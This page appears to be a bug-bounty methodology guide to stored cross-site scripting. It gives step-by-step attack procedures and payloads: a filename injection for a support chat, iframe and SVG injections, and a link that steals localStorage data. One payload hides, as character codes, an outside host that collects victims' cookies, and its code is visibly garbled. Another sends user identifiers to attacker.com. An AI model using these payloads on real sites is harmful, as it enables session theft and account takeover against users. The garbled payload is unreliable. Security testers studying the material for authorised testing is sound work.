# Stored Cross Site Scripting

## Check List

## Methodology

### Black Box

#### Blind XSS

{% stepper %}
{% step %}
Set up an HTTP/HTTPS proxy (e.g., Burp Suite) and enable Intercept
{% endstep %}

{% step %}
Open the target support/chat interface and start uploading a file to the chat
{% endstep %}

{% step %}
When the upload request is captured, pause it in the proxy (Intercept)
{% endstep %}

{% step %}
Modify the filename field in the intercepted upload request to the exact string below

```javascript
"><img src=1 onerror="url=String104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61+encodeURIComponent(document['cookie']);xhttp=&#x20new&#x20XMLHttpRequest();xhttp'GET',url,true;xhttp'send';
```
{% endstep %}

{% step %}
Forward the modified request so the file with the altered filename appears in the chat
{% endstep %}

{% step %}
Open or refresh the support chat page; when the filename containing the payload is rendered, the XSS should trigger
{% endstep %}
{% endstepper %}

***

{% stepper %}
{% step %}
Go to another users profile
{% endstep %}

{% step %}
Click private message
{% endstep %}

{% step %}
Type any subject
{% endstep %}

{% step %}
Type the following message `Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>`
{% endstep %}

{% step %}
Send the message
{% endstep %}

{% step %}
View the message (triggers the XSS)
{% endstep %}

{% step %}
Wait for the victim to read the message
{% endstep %}
{% endstepper %}

***

#### XSS In JSON Parameter

{% stepper %}
{% step %}
Log in and browse the site while keeping Burp Suite active
{% endstep %}

{% step %}
After checking the api requests that contain json parameters, check them
{% endstep %}

{% step %}
After checking once again, you will go to this api that has been created and a request has been made, and intercept the request
{% endstep %}

{% step %}
Inject inside parameters using XSS payloads

{% hint style="info" %}
We can also inject into the ipAddress parameters
{% endhint %}
{% endstep %}

{% step %}
For example, the request below is a real example

```json
{
    "ipAddress": "<svg on onload=(alert)(document.domain)>",
    "callBackURL":"dssdsd"
}
```
{% endstep %}

{% step %}
After sending the request to the server, it may give us an error code 400 in the response, but after sending the request, the payload was injected and the vulnerability occurred
{% endstep %}
{% endstepper %}

***

#### localStorage Data Exfiltration To An Attacker Server Via XSS

{% stepper %}
{% step %}
Open Chrome DevTools Press F12, navigate to Sources > Page tab
{% endstep %}

{% step %}
Search JavaScript Files Use Ctrl+F to search for keywords: path:, url:, api/, v1/
{% endstep %}

{% step %}
Identify Hidden Endpoint Locate unlinked POST endpoint like /platform/apps/lighthouse-homepage from fetch() call
{% endstep %}

{% step %}
Test Basic XSS Payload Submit POST request with body: {"userInput": "\<a href="javascript:alert(1)">clickme"}
{% endstep %}

{% step %}
Verify XSS Execution Confirm alert(1) popup proving unsanitized rendering
{% endstep %}

{% step %}
Inspect LocalStorage In DevTools Console, run JSON.stringify(localStorage) to identify sensitive keys
{% endstep %}

{% step %}
Craft Regex Exfiltration Payload , use&#x20;

```html
<a href="javascript:var match=JSON.stringify(localStorage).match(/ZNavIdentity\.userId=[^&]+&currEntityId=[^&]+/);if(match)fetch('https://attacker.com/?data='+encodeURIComponent(match[0]))">Click to "Verify"</a>  
```
{% endstep %}

{% step %}
Submit Stored XSS Payload POST {"userInput": \[above payload]} to store malicious link
{% endstep %}

{% step %}
Monitor Attacker Server Check https://attacker.com for exfiltrated userId and currEntityId from LocalStorage
{% endstep %}

{% step %}
Verify Account Takeover Confirm stolen PII enables full account access and privilege escalation
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
